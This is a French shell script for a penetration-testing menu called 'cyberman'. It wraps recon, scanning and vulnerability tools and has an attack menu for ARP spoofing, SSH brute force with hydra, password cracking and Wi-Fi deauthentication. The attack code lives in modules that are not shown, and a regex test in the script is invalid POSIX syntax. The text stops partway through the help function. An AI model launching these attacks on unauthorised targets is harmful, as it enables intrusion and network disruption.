#!/bin/sh
# =============================================================================
# CYBERMAN - Cyber Security Manager (Code Commun POSIX)
# =============================================================================
# Description: Gestionnaire complet des outils de sécurité cyber
# Author: Paul Delhomme
# Version: 2.0 - Migration POSIX Complète
# =============================================================================

# Détecter le shell pour adapter certaines syntaxes
if [ -n "$ZSH_VERSION" ]; then
    SHELL_TYPE="zsh"
elif [ -n "$BASH_VERSION" ]; then
    SHELL_TYPE="bash"
elif [ -n "$FISH_VERSION" ]; then
    SHELL_TYPE="fish"
else
    SHELL_TYPE="sh"
fi

# Charger la fonction utilitaire ensure_tool
UTILS_DIR="${DOTFILES_DIR:-$HOME/dotfiles}/zsh/functions/utils"
[ -f "$UTILS_DIR/ensure_tool.sh" ] && . "$UTILS_DIR/ensure_tool.sh" 2>/dev/null || true

# Répertoires de base
CYBERMAN_DIR="${CYBERMAN_DIR:-$HOME/dotfiles/zsh/functions/cyberman}"
# IMPORTANT: CYBER_DIR pointe vers modules/legacy, pas vers /cyber
CYBER_DIR="${CYBER_DIR:-$HOME/dotfiles/zsh/functions/cyberman/modules/legacy}"

# Sécuriser les dossiers cyberman au chargement
[ -f "$CYBERMAN_DIR/utils/secure_dirs.sh" ] && . "$CYBERMAN_DIR/utils/secure_dirs.sh" 2>/dev/null || true

# Charger le gestionnaire de cibles
[ -f "$CYBER_DIR/target_manager.sh" ] && . "$CYBER_DIR/target_manager.sh" 2>/dev/null || true

# DESC: Gestionnaire interactif complet pour les outils de cybersécurité. Organise les outils en catégories : reconnaissance, scanning, vulnérabilités, attaques, analyse et privacy. Installe automatiquement les outils manquants.
# USAGE: cyberman [category]
# EXAMPLE: cyberman
# EXAMPLE: cyberman recon
# EXAMPLE: cyberman scan
cyberman() {
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    MAGENTA='\033[0;35m'
    CYAN='\033[0;36m'
    BOLD='\033[1m'
    RESET='\033[0m'
    
    # S'assurer que CYBER_DIR est défini correctement (utiliser la valeur globale si définie)
    CYBER_DIR="${CYBER_DIR:-$HOME/dotfiles/zsh/functions/cyberman/modules/legacy}"
    export CYBER_DIR
    DOTFILES_DIR="${DOTFILES_DIR:-$HOME/dotfiles}"
    if [ -f "$DOTFILES_DIR/scripts/lib/ncurses_menu.sh" ]; then
        # shellcheck source=/dev/null
        . "$DOTFILES_DIR/scripts/lib/ncurses_menu.sh"
    fi
    
    # Charger tous les gestionnaires
    if [ -f "$CYBER_DIR/target_manager.sh" ]; then
        . "$CYBER_DIR/target_manager.sh"
    fi
    if [ -f "$CYBER_DIR/environment_manager.sh" ]; then
        . "$CYBER_DIR/environment_manager.sh"
    fi
    if [ -f "$CYBER_DIR/workflow_manager.sh" ]; then
        . "$CYBER_DIR/workflow_manager.sh"
    fi
    if [ -f "$CYBER_DIR/report_manager.sh" ]; then
        . "$CYBER_DIR/report_manager.sh"
    fi
    if [ -f "$CYBER_DIR/anonymity_manager.sh" ]; then
        . "$CYBER_DIR/anonymity_manager.sh"
    fi
    if [ -f "$CYBER_DIR/management_menu.sh" ]; then
        . "$CYBER_DIR/management_menu.sh"
    fi
    
    # Fonction pour afficher le header
    show_header() {
        clear
        printf "${CYAN}${BOLD}\n"
        echo "╔════════════════════════════════════════════════════════════════╗"
        echo "║                  CYBERMAN - Cyber Security Manager             ║"
        echo "║                  Gestionnaire Sécurité Cyber ZSH              ║"
        echo "╚════════════════════════════════════════════════════════════════╝"
        printf "${RESET}\n"
    }

    cyber_pick_menu() {
        _title="$1"
        _choice=""
        if [ -t 0 ] && [ -t 1 ] && command -v dotfiles_ncmenu_select >/dev/null 2>&1; then
            _menu_file=$(mktemp)
            cat > "$_menu_file"
            _choice=$(dotfiles_ncmenu_select "$_title" < "$_menu_file" 2>/dev/null || true)
            rm -f "$_menu_file"
        fi
        if [ -z "$_choice" ]; then
            printf "Choix: "
            read _choice
        fi
        printf "%s" "$_choice"
    }
    
    # =========================================================================
    # CATÉGORIE 1: RECONNAISSANCE & INFORMATION GATHERING
    # =========================================================================
    # DESC: Affiche le menu de reconnaissance et information gathering
    # USAGE: show_recon_menu
    # EXAMPLE: show_recon_menu
    show_recon_menu() {
        while true; do
            show_header
            printf "${YELLOW}🔍 RECONNAISSANCE & INFORMATION GATHERING${RESET}\n"
            printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
            echo "1.  WHOIS domain              - Informations domaine"
            echo "2.  DNS Lookup                - Requêtes DNS"
            echo "3.  DNSEnum scan              - Énumération DNS"
            echo "4.  Find subdomains           - Recherche sous-domaines"
            echo "5.  Recon domain              - Reconnaissance complète domaine"
            echo "6.  Enhanced traceroute       - Traceroute amélioré"
            echo "7.  Network map               - Cartographie réseau"
            echo "8.  Get HTTP headers          - En-têtes HTTP"
            echo "9.  Analyze headers           - Analyse en-têtes"
            echo "10. Get robots.txt            - Récupération robots.txt"
            echo "0.  Retour au menu principal"
            echo ""
            choice=$(cyber_pick_menu "CYBERMAN - Reconnaissance" <<'EOF'
WHOIS domain|1
DNS Lookup|2
DNSEnum scan|3
Find subdomains|4
Recon domain|5
Enhanced traceroute|6
Network map|7
Get HTTP headers|8
Analyze headers|9
Get robots.txt|10
Retour|0
EOF
)
            # Nettoyer le choix
            choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
            case "$choice" in
                1) 
                    . "$CYBER_DIR/reconnaissance/domain_whois.sh" && domain_whois
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                    ;;
                2) 
                    . "$CYBER_DIR/reconnaissance/dns_lookup.sh" && dns_lookup
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                    ;;
                3) 
                    . "$CYBER_DIR/reconnaissance/dnsenum_scan.sh" && ensure_tool dnsenum && dnsenum_scan
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                    ;;
                4) 
                    . "$CYBER_DIR/reconnaissance/find_subdomains.sh" && find_subdomains
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                    ;;
                5) 
                    . "$CYBER_DIR/reconnaissance/recon_domain.sh" && ensure_tool theHarvester && recon_domain
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                    ;;
                6) 
                    . "$CYBER_DIR/reconnaissance/enhanced_traceroute.sh" && enhanced_traceroute
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                    ;;
                7) 
                    . "$CYBER_DIR/reconnaissance/network_map.sh" && network_map
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                    ;;
                8) 
                    . "$CYBER_DIR/reconnaissance/get_http_headers.sh" && get_http_headers
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                    ;;
                9) 
                    . "$CYBER_DIR/reconnaissance/analyze_headers.sh" && analyze_headers
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                    ;;
                10) 
                    . "$CYBER_DIR/reconnaissance/get_robots_txt.sh" && get_robots_txt
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                    ;;
                11) 
                    . "$CYBER_DIR/scanning/check_telnet.sh" && check_telnet
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                    ;;
                12)
                    if [ -n "$CYBER_TARGETS" ] && [ "$(echo "$CYBER_TARGETS" | wc -w)" -gt 0 ]; then
                        echo "🔄 Reconnaissance sur toutes les cibles..."
                        for target in $CYBER_TARGETS; do
                            echo ""
                            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                            echo "🎯 Cible: $target"
                            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                            . "$CYBER_DIR/reconnaissance/domain_whois.sh" && domain_whois "$target"
                            . "$CYBER_DIR/reconnaissance/dns_lookup.sh" && dns_lookup "$target"
                            . "$CYBER_DIR/reconnaissance/get_http_headers.sh" && get_http_headers "$target"
                        done
                        echo ""
                        echo "✅ Reconnaissance terminée sur toutes les cibles"
                        printf "Appuyez sur une touche pour continuer..."; read dummy
                    else
                        echo "❌ Aucune cible configurée. Utilisez le menu 'Gestion des cibles' d'abord."
                        sleep 2
                    fi
                    ;;
                0) return ;;
                *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
            esac
        done
    }
    
    # =========================================================================
    # CATÉGORIE 2: SCANNING & ENUMERATION
    # =========================================================================
    # DESC: Affiche le menu de scanning réseau
    # USAGE: show_scan_menu
    # EXAMPLE: show_scan_menu
    show_scan_menu() {
        show_header
        printf "${YELLOW}🔎 SCANNING & ENUMERATION${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  Port scan                 - Scan de ports"
        echo "2.  Scan ports                - Alternative scan ports"
        echo "3.  Web port scan             - Scan ports web"
        echo "4.  Scan web ports            - Alternative scan ports web"
        echo "5.  Enum dirs                 - Énumération répertoires"
        echo "6.  Enum shares               - Énumération partages"
        echo "7.  Enumerate users           - Énumération utilisateurs"
        echo "8.  Web dir enum              - Énumération répertoires web"
        echo "9.  Network map               - Cartographie réseau"
        echo "10. Check Telnet              - Vérifier si telnet est actif"
        echo "11. Network Scanner          - Scanner réseau complet en temps réel"
        echo "12. Network Scanner Live      - Scanner réseau live continu"
        echo "13. Advanced Network Scan    - Scan réseau avancé avec ports/services/vuln"
        echo "14. Scan toutes les cibles    - Scan complet sur toutes les cibles"
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Scanning" <<'EOF'
Port scan|1
Scan ports|2
Web port scan|3
Scan web ports|4
Enum dirs|5
Enum shares|6
Enumerate users|7
Web dir enum|8
Network map|9
Check Telnet|10
Network Scanner|11
Network Scanner Live|12
Advanced Network Scan|13
Scan toutes les cibles|14
Retour|0
EOF
)
        # Nettoyer le choix
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1) 
                . "$CYBER_DIR/scanning/port_scan.sh" && ensure_tool nmap && port_scan
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            2) 
                . "$CYBER_DIR/scanning/scan_ports.sh" && ensure_tool nmap && scan_ports
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            3) 
                . "$CYBER_DIR/scanning/web_port_scan.sh" && ensure_tool nmap && web_port_scan
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            4) 
                . "$CYBER_DIR/scanning/scan_web_ports.sh" && ensure_tool nmap && scan_web_ports
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            5) 
                . "$CYBER_DIR/scanning/enum_dirs.sh" && enum_dirs
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            6) 
                . "$CYBER_DIR/scanning/enum_shares.sh" && enum_shares
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            7) 
                . "$CYBER_DIR/scanning/enumerate_users.sh" && enumerate_users
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            8) 
                . "$CYBER_DIR/scanning/web_dir_enum.sh" && ensure_tool gobuster && web_dir_enum
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            9) 
                . "$CYBER_DIR/reconnaissance/network_map.sh" && network_map
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            10) 
                . "$CYBER_DIR/scanning/check_telnet.sh" && check_telnet
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            11)
                . "$CYBER_DIR/scanning/network_scanner_integrated.sh" && network_scan_cyberman --save
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            12)
                . "$CYBER_DIR/scanning/network_scanner_integrated.sh" && network_scan_cyberman --live --save
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            13)
                . "$CYBER_DIR/scanning/advanced_network_scan.sh" && advanced_network_scan "" --full --vuln --save
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            14)
                if [ -n "$CYBER_TARGETS" ] && [ "$(echo "$CYBER_TARGETS" | wc -w)" -gt 0 ]; then
                    echo "🔄 Scan complet sur toutes les cibles..."
                    for target in $CYBER_TARGETS; do
                        echo ""
                        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                        echo "🎯 Cible: $target"
                        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                        . "$CYBER_DIR/scanning/port_scan.sh" && ensure_tool nmap && port_scan "$target"
                        . "$CYBER_DIR/scanning/web_dir_enum.sh" && ensure_tool gobuster && web_dir_enum "$target"
                    done
                else
                    echo "❌ Aucune cible configurée. Utilisez le menu 'Gestion des cibles' d'abord."
                    sleep 2
                fi
                ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # =========================================================================
    # CATÉGORIE 3: VULNERABILITY ASSESSMENT
    # =========================================================================
    # DESC: Affiche le menu de scan de vulnérabilités
    # USAGE: show_vuln_menu
    # EXAMPLE: show_vuln_menu
    show_vuln_menu() {
        show_header
        printf "${YELLOW}🛡️ VULNERABILITY ASSESSMENT & SESSION${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  Nmap vuln scan            - Scan vulnérabilités Nmap"
        echo "2.  Vuln scan                 - Scan vulnérabilités général"
        echo "3.  Scan vulns                - Alternative scan vulnérabilités"
        echo "4.  Nikto scan                - Scan Nikto"
        echo "5.  Web vuln scan             - Scan vulnérabilités web"
        echo "6.  Check SSL                 - Vérification SSL"
        echo "7.  Check SSL cert            - Vérification certificat SSL"
        echo "8.  Check Heartbleed          - Vérification Heartbleed"
        echo "9.  Scan vuln toutes cibles   - Scan vulnérabilités sur toutes les cibles"
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Vulnerability" <<'EOF'
Nmap vuln scan|1
Vuln scan|2
Scan vulns|3
Nikto scan|4
Web vuln scan|5
Check SSL|6
Check SSL cert|7
Check Heartbleed|8
Scan vuln toutes cibles|9
Retour|0
EOF
)
        # Nettoyer le choix
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1) 
                . "$CYBER_DIR/vulnerability/nmap_vuln_scan.sh" && ensure_tool nmap && nmap_vuln_scan
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            2) 
                . "$CYBER_DIR/vulnerability/vuln_scan.sh" && vuln_scan
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            3) 
                . "$CYBER_DIR/vulnerability/scan_vulns.sh" && scan_vulns
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            4) 
                . "$CYBER_DIR/vulnerability/nikto_scan.sh" && ensure_tool nikto && nikto_scan
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            5) 
                . "$CYBER_DIR/vulnerability/web_vuln_scan.sh" && web_vuln_scan
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            6) 
                . "$CYBER_DIR/vulnerability/check_ssl.sh" && check_ssl
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            7) 
                . "$CYBER_DIR/vulnerability/check_ssl_cert.sh" && check_ssl_cert
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            8) 
                . "$CYBER_DIR/vulnerability/check_heartbleed.sh" && check_heartbleed
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            9)
                if [ -n "$CYBER_TARGETS" ] && [ "$(echo "$CYBER_TARGETS" | wc -w)" -gt 0 ]; then
                    echo "🔄 Scan de vulnérabilités sur toutes les cibles..."
                    for target in $CYBER_TARGETS; do
                        echo ""
                        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                        echo "🎯 Cible: $target"
                        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                        . "$CYBER_DIR/vulnerability/nmap_vuln_scan.sh" && ensure_tool nmap && nmap_vuln_scan "$target"
                        if [ "$target" =~ ^https?:// ]; then
                            . "$CYBER_DIR/vulnerability/nikto_scan.sh" && ensure_tool nikto && nikto_scan "$target"
                            . "$CYBER_DIR/vulnerability/check_ssl.sh" && check_ssl "$target"
                        fi
                    done
                    echo ""
                    echo "✅ Scan de vulnérabilités terminé sur toutes les cibles"
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                else
                    echo "❌ Aucune cible configurée. Utilisez le menu 'Gestion des cibles' d'abord."
                    sleep 2
                fi
                ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # =========================================================================
    # CATÉGORIE 4: NETWORK ATTACKS & EXPLOITATION
    # =========================================================================
    # DESC: Affiche le menu d'attaques réseau
    # USAGE: show_attack_menu
    # EXAMPLE: show_attack_menu
    show_attack_menu() {
        show_header
        printf "${YELLOW}⚔️ NETWORK ATTACKS & EXPLOITATION${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  ARP Spoof                 - Attaque ARP spoofing"
        echo "2.  Brute SSH                 - Brute force SSH"
        echo "3.  Password crack            - Cracking de mots de passe"
        echo "4.  Deauth attack             - Attaque désauthentification Wi-Fi"
        echo "5.  Web traceroute            - Traceroute web"
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Attacks" <<'EOF'
ARP Spoof|1
Brute SSH|2
Password crack|3
Deauth attack|4
Web traceroute|5
Retour|0
EOF
)
        # Nettoyer le choix
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1) . "$CYBER_DIR/attacks/arp_spoof.sh" && ensure_tool arpspoof && arp_spoof ;;
            2) . "$CYBER_DIR/attacks/brute_ssh.sh" && ensure_tool hydra && brute_ssh ;;
            3) . "$CYBER_DIR/attacks/password_crack.sh" && password_crack ;;
            4) . "$CYBER_DIR/attacks/deauth_attack.sh" && ensure_tool aireplay-ng && deauth_attack ;;
            5) . "$CYBER_DIR/attacks/web_traceroute.sh" && web_traceroute ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # =========================================================================
    # CATÉGORIE 5: NETWORK ANALYSIS & MONITORING
    # =========================================================================
    # DESC: Affiche le menu d'analyse réseau
    # USAGE: show_analysis_menu
    # EXAMPLE: show_analysis_menu
    show_analysis_menu() {
        show_header
        printf "${YELLOW}📡 NETWORK ANALYSIS & MONITORING${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  Sniff traffic             - Capture trafic réseau"
        echo "2.  Wifi scan                 - Scan réseaux Wi-Fi"
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Analysis" <<'EOF'
Sniff traffic|1
Wifi scan|2
Retour|0
EOF
)
        # Nettoyer le choix
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1) . "$CYBER_DIR/analysis/sniff_traffic.sh" && ensure_tool tcpdump && sniff_traffic ;;
            2) . "$CYBER_DIR/analysis/wifi_scan.sh" && wifi_scan ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # =========================================================================
    # GESTION DES ENVIRONNEMENTS
    # =========================================================================
    # DESC: Affiche le menu de gestion des environnements
    # USAGE: show_environment_menu
    # EXAMPLE: show_environment_menu
    show_environment_menu() {
        if [ -f "$CYBER_DIR/environment_manager.sh" ]; then
            . "$CYBER_DIR/environment_manager.sh"
            show_environment_menu
        else
            echo "❌ Gestionnaire d'environnements non disponible"
            sleep 1
        fi
    }
    
    # =========================================================================
    # GESTION DES WORKFLOWS
    # =========================================================================
    # DESC: Affiche le menu de gestion des workflows
    # USAGE: show_workflow_menu
    # EXAMPLE: show_workflow_menu
    show_workflow_menu() {
        if [ -f "$CYBER_DIR/workflow_manager.sh" ]; then
            . "$CYBER_DIR/workflow_manager.sh"
            show_workflow_menu
        else
            echo "❌ Gestionnaire de workflows non disponible"
            sleep 1
        fi
    }
    
    # =========================================================================
    # GESTION DES RAPPORTS
    # =========================================================================
    # DESC: Affiche le menu de gestion des rapports
    # USAGE: show_report_menu
    # EXAMPLE: show_report_menu
    show_report_menu() {
        if [ -f "$CYBER_DIR/report_manager.sh" ]; then
            . "$CYBER_DIR/report_manager.sh"
            show_report_menu
        else
            echo "❌ Gestionnaire de rapports non disponible"
            sleep 1
        fi
    }
    
    # =========================================================================
    # GESTION DES CIBLES
    # =========================================================================
    # DESC: Affiche le menu de gestion des cibles
    # USAGE: show_target_menu
    # EXAMPLE: show_target_menu
    show_target_menu() {
        show_header
        printf "${YELLOW}🎯 GESTION DES CIBLES${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        if [ -n "$CYBER_TARGETS" ] && [ "$(echo "$CYBER_TARGETS" | wc -w)" -gt 0 ]; then
            show_targets
            echo ""
        else
            echo "⚠️  Aucune cible configurée"
            echo ""
        fi
        
        echo "1.  Ajouter une cible"
        echo "2.  Ajouter plusieurs cibles"
        echo "3.  Supprimer une cible"
        echo "4.  Vider toutes les cibles"
        echo "5.  Afficher les cibles"
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Gestion cibles" <<'EOF'
Ajouter une cible|1
Ajouter plusieurs cibles|2
Supprimer une cible|3
Vider toutes les cibles|4
Afficher les cibles|5
Retour|0
EOF
)
        # Nettoyer le choix
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1)
                echo ""
                printf "🎯 Entrez la cible (IP, domaine ou URL): "
        read target
                if [ -n "$target" ]; then
                    add_target "$target"
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                fi
                ;;
            2)
                echo ""
                echo "🎯 Entrez les cibles - séparées par des espaces: "
                echo "Exemple: 192.168.1.1 192.168.1.2 example.com"
                printf "Cibles: "
        read targets
                if [ -n "$targets" ]; then
                    add_target $targets
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                fi
                ;;
            3)
                if [ -n "$CYBER_TARGETS" ] && [ "$(echo "$CYBER_TARGETS" | wc -w)" -gt 0 ]; then
                    echo ""
                    show_targets
                    echo ""
                    printf "🎯 Entrez l'index ou le nom de la cible à supprimer: "
        read target
                    if [ -n "$target" ]; then
                        remove_target "$target"
                        echo ""
                        printf "Appuyez sur une touche pour continuer..."; read dummy
                    fi
                else
                    echo "❌ Aucune cible à supprimer"
                    sleep 1
                fi
                ;;
            4)
                if [ -n "$CYBER_TARGETS" ] && [ "$(echo "$CYBER_TARGETS" | wc -w)" -gt 0 ]; then
                    echo ""
                    printf "⚠️  Êtes-vous sûr de vouloir supprimer toutes les cibles? (o/N): "
        read confirm
                    if [ "$confirm" = "o" ] || [ "$confirm" = "O" ]; then
                        clear_targets
                        echo ""
                        printf "Appuyez sur une touche pour continuer..."; read dummy
                    fi
                else
                    echo "❌ Aucune cible à supprimer"
                    sleep 1
                fi
                ;;
            5)
                echo ""
                if [ -n "$CYBER_TARGETS" ] && [ "$(echo "$CYBER_TARGETS" | wc -w)" -gt 0 ]; then
                    show_targets
                else
                    echo "⚠️  Aucune cible configurée"
                fi
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # =========================================================================
    # MENU PRINCIPAL
    # =========================================================================
    # DESC: Affiche le menu principal de cyberman
    # USAGE: show_main_menu
    # EXAMPLE: show_main_menu
    show_main_menu() {
        show_header
        
        # Afficher l'environnement actif et les cibles configurées
        printf "${CYAN}${BOLD}État actuel:${RESET}\n"        
        # Afficher l'environnement actif
        # IMPORTANT: Utiliser directement la variable globale si elle existe
        # Ne pas recharger systématiquement car cela pourrait réactiver un environnement désactivé
        current_env=""
        if [ -n "$CYBER_CURRENT_ENV" ]; then
            # Utiliser directement la variable globale
            current_env="$CYBER_CURRENT_ENV"
        elif [ -f "$CYBER_DIR/environment_manager.sh" ]; then
            # Charger seulement si la variable n'est pas définie (première fois)
            . "$CYBER_DIR/environment_manager.sh" 2>/dev/null
            if [ -f "$CYBER_DIR/environment_manager.sh" ] && command -v has_active_environment >/dev/null 2>&1 && has_active_environment 2>/dev/null; then
                current_env=$(command -v get_current_environment >/dev/null 2>&1 && get_current_environment 2>/dev/null || echo "")
            fi
        fi
        
        # Détecter si un environnement correspond aux cibles actives
        matching_env=""
        if [ -z "$current_env" ] && [ -n "${CYBER_TARGETS+x}" ] && [ "$(echo "$CYBER_TARGETS" | wc -w)" -gt 0 ]; then
            # Charger environment_manager pour utiliser find_environment_by_targets
            if [ -f "$CYBER_DIR/environment_manager.sh" ]; then
                . "$CYBER_DIR/environment_manager.sh" 2>/dev/null
                if type find_environment_by_targets >/dev/null 2>&1; then
                    matching_env=$(find_environment_by_targets 2>/dev/null)
                fi
            fi
        fi
        
        if [ -n "$current_env" ]; then
            printf "   ${GREEN}🌍 Environnement actif: ${BOLD}%s${RESET}\n" "${current_env}"
            # Afficher les statistiques de l'environnement actif
            env_file="${HOME}/.cyberman/environments/${current_env}.json"
            if [ -f "$env_file" ] && command -v jq >/dev/null 2>&1; then
                notes_count=$(jq '.notes | length' "$env_file" 2>/dev/null || echo "0")
                history_count=$(jq '.history | length' "$env_file" 2>/dev/null || echo "0")
                results_count=$(jq '.results | length' "$env_file" 2>/dev/null || echo "0")
                todos_count=$(jq '.todos | length' "$env_file" 2>/dev/null || echo "0")
                todos_pending=$(jq '[.todos[]? | select(.status == "pending")] | length' "$env_file" 2>/dev/null || echo "0")
                todos_info=$(printf "%s (%s en attente)" "${todos_count}" "${todos_pending}")
                printf "      ${CYAN}📌 Notes: %s | 📜 Actions: %s | 📊 Résultats: %s | ✅ TODOs: %s${RESET}\n" "${notes_count}" "${history_count}" "${results_count}" "${todos_info}"
            fi
        elif [ -n "$matching_env" ]; then
            printf "   ${YELLOW}🌍 Aucun environnement actif${RESET}\n"
            env_info="'(correspond aux cibles actives)'"
            printf "   ${CYAN}💡 Environnement détecté: ${BOLD}%s${RESET} %s\n" "${matching_env}" "${env_info}"
            printf "   ${CYAN}💡 Chargez-le via: ${BOLD}Option 1 > Environnements > Charger${RESET}\n"
        else
            printf "   ${YELLOW}🌍 Aucun environnement actif${RESET}\n"
        fi
        
        # Afficher les cibles configurées
        # S'assurer que les cibles sont chargées
        if [ -z "${CYBER_TARGETS+x}" ]; then
            if [ -f "$CYBER_DIR/target_manager.sh" ]; then
                . "$CYBER_DIR/target_manager.sh" 2>/dev/null
            fi
        fi
        
        # Vérifier si has_targets existe et l'utiliser
        if type has_targets >/dev/null 2>&1 && has_targets 2>/dev/null; then
            printf "   ${GREEN}🎯 Cibles actives: $(echo "$CYBER_TARGETS" | wc -w)${RESET}\n"
            i=1
            for target in $CYBER_TARGETS; do
                printf "      ${GREEN}$i.${RESET} $target\n"
                i=$((i + 1))
            done
        elif [ -n "${CYBER_TARGETS+x}" ] && [ "$(echo "$CYBER_TARGETS" | wc -w)" -gt 0 ]; then
            printf "   ${GREEN}🎯 Cibles actives: $(echo "$CYBER_TARGETS" | wc -w)${RESET}\n"
            i=1
            for target in $CYBER_TARGETS; do
                printf "      ${GREEN}$i.${RESET} $target\n"
                i=$((i + 1))
            done
        else
            printf "   ${YELLOW}🎯 Aucune cible configurée${RESET}\n"
        fi
        echo ""
        
        printf "${CYAN}${BOLD}Menu principal${RESET}\n"
        echo "1.  ⚙️  Gestion & Configuration - environnements, cibles, workflows, rapports, anonymat"
        echo "2.  🔍 Reconnaissance & Information Gathering"
        echo "3.  🔎 Scanning & Enumeration"
        echo "4.  🛡️  Vulnerability Assessment & Session"
        echo "5.  🌐 Web Security & Testing"
        echo "6.  📡 Network Tools - Analysis, Attacks, Devices"
        echo "7.  📱 IoT Devices & Embedded Systems"
        echo "8.  🔧 Advanced Tools - Metasploit, Custom Scripts"
        echo "9.  🛠️  Utilitaires - hash, encode/decode, etc."
        echo "10. 🎓 Apprentissage & Labs - cyberlearn intégré"
        echo "11. 🔍 OSINT Tools - Outils OSINT avec IA"
        echo "12. 🚀 Assistant de test complet"
        
        # Afficher les options rapides si un environnement est actif
        if [ -f "$CYBER_DIR/environment_manager.sh" ] && command -v has_active_environment >/dev/null 2>&1 && has_active_environment 2>/dev/null; then
            current_env=$(command -v get_current_environment >/dev/null 2>&1 && get_current_environment 2>/dev/null || echo "")
            echo ""
            printf "${GREEN}📝 Environnement actif: $current_env${RESET}\n"
            echo "13. 📝 Notes & Informations de l'environnement actif"
            echo "14. 📊 Rapports - consulter, exporter"
            echo "15. 🔄 Workflows - créer, exécuter, gérer"
            echo "16. 🚫 Désactiver l'environnement actif"
        fi
        echo ""
        echo "h.  Aide"
        echo "q.  Quitter"
        echo ""
    }
    
    show_help() {
        show_header
        cat <<EOF
${CYAN}${BOLD}CYBERMAN - Aide${RESET}

